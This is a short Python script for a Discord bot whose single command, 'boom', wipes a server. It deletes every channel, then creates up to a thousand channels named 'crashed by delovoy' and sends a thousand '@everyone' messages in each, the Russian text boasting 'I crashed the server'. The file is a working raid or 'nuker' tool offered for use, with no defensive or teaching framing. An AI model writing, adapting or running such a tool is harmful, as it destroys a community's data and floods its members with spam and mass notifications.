import nextcord
import asyncio
from discord.ext.commands import Bot
from nextcord.ext import commands

intents = nextcord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='/', intents=intents)

@bot.command()
async def boom(ctx, num_channels=1000, num_messages=1000):
    guild = ctx.guild
    await asyncio.gather(delete_all_channels(guild), create_channels(guild, num_channels, num_messages))

async def delete_all_channels(guild):
    await asyncio.gather(*[channel.delete() for channel in guild.channels])

async def create_channels(guild, num_channels, num_messages):
    tasks = []
    for i in range(num_channels):
        channel_name = f'crashed by delovoy-{i+1}'
        tasks.append(send_messages(guild, channel_name, num_messages))

    await asyncio.gather(*tasks)

async def send_messages(guild, channel_name, num_messages):
    channel = await guild.create_text_channel(channel_name)
    
    for i in range(num_messages):
        await channel.send('я крашнул сервак @everyone')

bot.run('TOKEN')